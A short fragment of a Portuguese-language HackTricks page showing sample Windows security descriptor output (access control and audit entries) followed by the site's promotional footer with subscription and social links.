DiscretionaryAcl: {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)...}
SystemAcl: {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse), BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users: SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess (Traverse)...}
RawDescriptor: System.Security.AccessControl.CommonSecurityDescriptor
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
